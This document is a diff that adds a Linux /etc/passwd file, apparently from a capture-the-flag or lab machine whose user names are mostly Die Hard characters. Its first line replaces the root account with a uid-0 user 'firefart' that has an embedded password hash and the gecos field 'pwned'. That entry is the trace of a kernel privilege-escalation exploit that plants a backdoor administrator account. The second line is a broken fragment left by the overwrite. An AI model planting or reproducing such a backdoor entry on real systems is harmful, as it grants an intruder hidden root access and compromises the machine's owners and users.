@@ -1,0 +1,72 @@
+firefart:fioeRkrQBfChc:0:0:pwned:/root:/bin/bash
+/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+syslog:x:101:103::/home/syslog:/bin/false
+messagebus:x:102:105::/var/run/dbus:/bin/false
+colord:x:103:108:colord colour management daemon,,,:/var/lib/colord:/bin/false
+lightdm:x:104:111:Light Display Manager:/var/lib/lightdm:/bin/false
+whoopsie:x:105:114::/nonexistent:/bin/false
+avahi-autoipd:x:106:117:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
+avahi:x:107:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+usbmux:x:108:46:usbmux daemon,,,:/home/usbmux:/bin/false
+kernoops:x:109:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
+pulse:x:110:119:PulseAudio daemon,,,:/var/run/pulse:/bin/false
+rtkit:x:111:122:RealtimeKit,,,:/proc:/bin/false
+speech-dispatcher:x:112:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
+hplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+saned:x:114:123::/home/saned:/bin/false
+jmcclane:x:1001:1001:jmcclane,,,:/home/jmcclane:/bin/bash
+dovecot:x:117:127:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
+dovenull:x:118:65534:Dovecot login user,,,:/nonexistent:/bin/false
+postfix:x:115:125::/var/spool/postfix:/bin/false
+hgennaro:x:1000:1000:hgennaro,,,:/home/hgennaro:/bin/bash
+apowell:x:1002:1002:apowell,,,:/home/apowell:/bin/bash
+drobinson:x:1003:1003:drobinson,,,:/home/drobinson:/bin/bash
+rthornburg:x:1004:1004:rthornburg,,,:/home/rthornburg:/bin/bash
+hellis:x:1005:1005:hellis,,,:/home/hellis:/bin/bash
+jtakagi:x:1006:1006:jtakagi,,,:/home/jtakagi:/bin/bash
+hgruber:x:1007:1007:hgruber,,,:/home/hgruber:/bin/bash
+gwallens:x:1008:1008:gwallens,,,:/home/gwallens:/bin/bash
+bjohnson:x:1009:1009:bjohnson,,,:/home/bjohnson:/bin/bash
+ljohnson:x:1010:1010:ljohnson,,,:/home/ljohnson:/bin/bash
+resperanza:x:1011:1011:resperanza,,,:/home/resperanza:/bin/bash
+cstuart:x:1012:1012:cstuart,,,:/home/cstuart:/bin/bash
+mgrant:x:1013:1013:mgrant,,,:/home/mgrant:/bin/bash
+clorenzo:x:1014:1014:clorenzo,,,:/home/clorenzo:/bin/bash
+lbarnes:x:1015:1015:lbarnes,,,:/home/lbarnes:/bin/bash
+scoleman:x:1016:1016:scoleman,,,:/home/scoleman:/bin/bash
+sgruber:x:1017:1017:sgruber,,,:/home/sgruber:/bin/bash
+zcarver:x:1018:1018:zcarver,,,:/home/zcarver:/bin/bash
+jlambert:x:1019:1019:jlambert,,,:/home/jlambert:/bin/bash
+ckowalski:x:1020:1020:ckowalski,,,:/home/ckowalski:/bin/bash
+wcobb:x:1021:1021:wcobb,,,:/home/wcobb:/bin/bash
+rwalsh:x:1022:1022:rwalsh,,,:/home/rwalsh:/bin/bash
+mtargo:x:1023:1023:mtargo,,,:/home/mtargo:/bin/bash
+cweiss:x:1024:1024:cweiss,,,:/home/cweiss:/bin/bash
+tgabriel:x:1025:1025:tgabriel,,,:/home/tgabriel:/bin/bash
+mfarrell:x:1026:1026:mfarrell,,,:/home/mfarrell:/bin/bash
+mlinh:x:1027:1027:mlinh,,,:/home/mlinh:/bin/bash
+mbowman:x:1028:1028:mbowman,,,:/home/mbowman:/bin/bash
+fkaludis:x:1029:1029:fkaludis,,,:/home/fkaludis:/bin/bash
+ykomarov:x:1030:1030:ykomarov,,,:/home/ykomarov:/bin/bash
+fritz:x:1031:1031:fritz,,,:/home/fritz:/bin/bash
+ftp:x:116:128:ftp daemon,,,:/srv/ftp:/bin/false
+sshd:x:119:65534::/var/run/sshd:/usr/sbin/nologin
+statd:x:120:65534::/var/lib/nfs:/bin/false
+
